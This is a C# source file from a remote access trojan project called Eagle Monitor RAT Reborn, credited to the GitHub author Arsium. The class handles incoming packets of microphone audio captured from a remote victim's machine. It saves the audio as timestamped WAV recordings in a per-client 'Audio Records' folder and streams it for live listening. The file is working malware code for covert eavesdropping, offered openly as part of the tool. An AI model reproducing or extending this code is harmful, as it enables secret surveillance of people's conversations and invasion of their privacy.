using Eagle_Monitor_RAT_Reborn.Network;
using NAudio.Wave;
using PacketLib.Packet;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class RemoteAudioCapturePacketHandler
    {
        public RemoteAudioCapturePacketHandler(RemoteAudioCapturePacket remoteAudioCapturePacket) : base()//, ClientHandler clientHandler)
        {
            if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm != null)
            {
                try
                {

                    if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.HasAlreadyConnected == false)
                    {
                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentFileName = ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientPath + "\\Audio Records\\" + Misc.Utils.DateFormater() + ".wav";
                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentOffset = 0;
                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.WaveFileWriter = new WaveFileWriter(ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentFileName, new WaveFormat(44100, 1));
                    }
                    //currentOffset
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.HasAlreadyConnected = true;

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.BufferedWaveProvider.AddSamples(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.WaveFileWriter.Write(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.WaveFileWriter.Flush();

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.BaseIp].ClientForm.RemoteMicrophoneHandler.CurrentOffset += remoteAudioCapturePacket.bytesRecorded;
                }
                catch { }
                return;
            }
        }
    }
}
